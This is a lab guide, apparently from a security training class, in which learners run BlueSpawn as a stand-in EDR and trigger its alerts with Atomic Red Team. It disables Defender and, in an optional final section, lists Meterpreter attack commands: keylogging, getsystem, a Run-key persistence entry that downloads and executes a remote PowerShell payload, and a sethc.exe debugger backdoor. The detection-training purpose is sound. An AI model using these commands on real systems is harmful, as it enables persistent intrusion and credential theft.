

# Atomic Red Team And Bluespawn

In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 

BlueSpawn will monitor the system for "weird" behavior and note it when it occurs. For the money, it is great.

In this lab, we will be starting BlueSpawn and then running Atomic Red Team to trigger a lot of alerts.

First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:

`Set-MpPreference -DisableRealtimeMonitoring $true`

This will disable Defender for this session.

If you get angry red errors, that is Ok, it means Defender is not running.


Let's get started by opening a Terminal as Administrator:


![](attachments/Clipboard_2020-06-12-10-36-44.png)


Now, let's open a command Prompt:

![](attachments/Clipboard_2020-06-16-09-53-18.png)

####NOTE##### 

If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 

 

Simply click the Windows Start button in the lower left of your screen and type: 

 

`Powershell` 

or 

`Ubuntu`

or 

`Command Prompt` 

 

For PowerShell and Command Prompt, please right click on them and select Run As Administrator 

###END NOTE###

Next, let’s change directories to tools and start Bluespawn:
C:\Users\adhd>`cd \tools`

C:\tools>`BLUESPAWN-client-x64.exe --monitor --level Cursory`


![](attachments/Clipboard_2020-06-16-09-46-00.png)

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell Prompt:

![](attachments/Clipboard_2020-06-16-09-55-12.png)

Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

PS C:\Users\adhd> `cd C:\AtomicRedTeam\invoke-atomicredteam\`

Then, install the proper yaml modules

PS C:\Users\adhd> `Install-Module -Name powershell-yaml`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Import-Module .\Invoke-AtomicRedTeam.psm1`


Now, we need to invoke all the Atomic Tests.

Special note...  Don't do this in production...  Ever.  Always run tools like Atomic Red Team on test systems.  We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode.  This is so you can see what the protection would have done, but it will allow the tests to finish.

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest All`

If you get any “file exists” questions or errors, just select Yes.

It should look like this:

![](attachments/Clipboard_2020-06-16-09-48-18.png)

Please note, there will be some errors when this runs.  This is normal.


Only let this run for about 120 seconds!!!  Kill it with Ctrl + c!!

You should be getting a lot of alerts with Bluespawn Switch tabs in your Terminal to see them:

![](attachments/Clipboard_2020-06-16-09-47-26.png)


Now, let’s go back to the PowerShell prompt and clean up:

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest All -Cleanup`

It should look like this:

![](attachments/Clipboard_2020-06-23-13-36-10.png)

# If you have more time

Feel free to exploit system using the commands we went through in AppLocker or Sysmon and then run the following Meterpreter commands


Run commands

meterpreter > `keyscan_start`

meterpreter > `keyscan_dump`

![](attachments/Clipboard_2020-06-15-13-52-00.png)



meterpreter > `shell`

C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`

C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

![](attachments/Clipboard_2020-06-15-14-00-53.png)



meterpreter >`getsystem`

![](attachments/Clipboard_2020-06-15-13-52-28.png)


![](attachments/Clipboard_2020-06-15-13-56-34.png)




